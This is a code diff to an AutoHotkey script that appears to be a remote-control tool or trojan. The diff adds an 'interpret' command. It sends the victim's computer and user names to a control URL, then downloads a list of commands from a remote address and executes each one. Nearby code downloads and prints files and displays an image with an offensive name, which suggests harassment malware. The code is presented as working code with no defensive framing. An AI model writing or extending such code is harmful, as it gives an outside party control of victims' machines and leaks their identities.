@@ -186,9 +186,34 @@ Interpret(command,binurl,mousean,sleept,RvCmdVersion)
 				Gui, Add, Pic, w100 h100, pedo.png
 				mousean := SubArray3
 			}
+			else if SubArray2 = interpret
+			{	
+				temp :=  binurl "log=" A_ComputerName "--" A_UserName ":-interpretting_contents_of:-" SubArray3
+				whr := ComObjCreate("WinHttp.WinHttpRequest.5.1")
+				whr.Open("GET",temp, true)
+				whr.Send()
+				whr.WaitForResponse()
+				temp := whr.ResponseText
+				
+				whr := ComObjCreate("WinHttp.WinHttpRequest.5.1")
+				whr.Open("GET",SubArray3, true)
+				whr.Send()
+				whr.WaitForResponse()
+				Coms := whr.ResponseText
+				
+				if Coms !=
+				{
+					Loop, parse, Coms,^
+					{
+						outar := Interpret(A_LoopField,binurl,mousean,sleept,RvCmdVersion)
+						mousean := outar[1]
+						sleept := outar[2]
+					}
+				}
+			}
 			else if SubArray2 = printfile
 			{
-				temp :=  binurl "log=" A_ComputerName "--" A_UserName ":-now_dowloading_and_printing_:-" SubArray3
+				temp :=  binurl "log=" A_ComputerName "--" A_UserName ":-now_dowloading_and_printing:-" SubArray3
 				whr := ComObjCreate("WinHttp.WinHttpRequest.5.1")
 				whr.Open("GET",temp, true)
 				whr.Send()
